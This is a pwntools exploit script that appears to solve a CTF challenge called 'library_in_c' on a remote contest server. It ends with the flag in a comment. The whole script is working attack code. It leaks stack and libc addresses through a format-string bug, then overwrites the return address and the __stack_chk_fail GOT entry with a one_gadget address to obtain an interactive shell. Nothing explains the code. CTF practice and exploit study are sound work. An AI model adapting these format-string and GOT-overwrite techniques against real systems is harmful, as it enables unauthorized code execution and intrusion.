from pwn import * 

#p = process("./library_in_c")
p = remote("shell.actf.co",20201)

chk_got = 0x601020
main = [0x0400747,0,0]
one = [0x45216,0x4526a,0xf02a4,0xf1147]

#---- find stack and libc address ----- 
payload = "%lx     "
payload += "%27$lx  "

p.sendlineafter("name?",payload)

p.recvuntil("there ")
ret = int(p.recv(12),16) +0x2738
p.recv(5)
libc = int(p.recv(12),16) -0x20830

log.info(hex(libc))

main[1] = int(hex(main[0])[2:4],16)-4
main[2] = int(hex(main[0])[4:],16)-main[1]-8

# --- overwrite ret addr ------- 

st = "%"+str(main[1])+"c"
st += " "*(8-len(st))

payload2 = st        
payload2 += "%21$n  "  

st = "%"+str(main[2])+"c"
st += " "*(8-len(st))

payload2 += st
payload2 += "%20$hn   "  

payload2 += p64(ret)         #20 - last byte
payload2 += p64(ret+2)       #21 - first byte

p.sendlineafter("out?",payload2)

l = (main[1]+main[2]) / 1024

for i in range(0,l-1) : 
    p.recv(1024)

# --- overwrite stack_chk 's got -----

one_gadget = [0,0,0,0]
one_gadget[0] = libc+one[0]
one_gadget[1] = int(hex(one_gadget[0])[2:6],16) #fist 
one_gadget[2] = int(hex(one_gadget[0])[6:10],16)  #middle
one_gadget[3] = int(hex(one_gadget[0])[10:14],16) #last

w3 = "%"+str(one_gadget[3]-1)+"c"
w3 += " "*(8-len(w3))

w2 = "%"+str(one_gadget[2]-one_gadget[3]+0x10000-3)+"c"
w2 += " "*(8-len(w2))

w1 = "%"+str(one_gadget[1]-1)+"c"
w1 += " "*(8-len(w1))

payload = w3
payload += "%12$hn  "

payload += w2
payload += "%13$hn  "

payload += p64(chk_got) #12 last bytes 
payload += p64(chk_got+2) #13 middle bytes

p.sendlineafter("name?",payload)

l = (one_gadget[2]+0x10000) / 1024

for i in range(0,l-1) : 
    p.recv(1024)

# --- overwrite got and canary ------- 

log.info(hex(one_gadget[0]))

payload2 = w1
payload2 += "%21$hn  "  

payload2 += "%10c    "
payload2 += "%20$hn  "  

payload2 += p64(ret-8)         #20 - canary
payload2 += p64(chk_got+4)       #21 - got's last byte
pause()
p.sendlineafter("out?",payload2)

l = (one_gadget[1]) / 1024

for i in range(0,l-1) : 
    p.recv(1024)


#actf{us1ng_c_15_n3v3r_4_g00d_1d34}
p.interactive()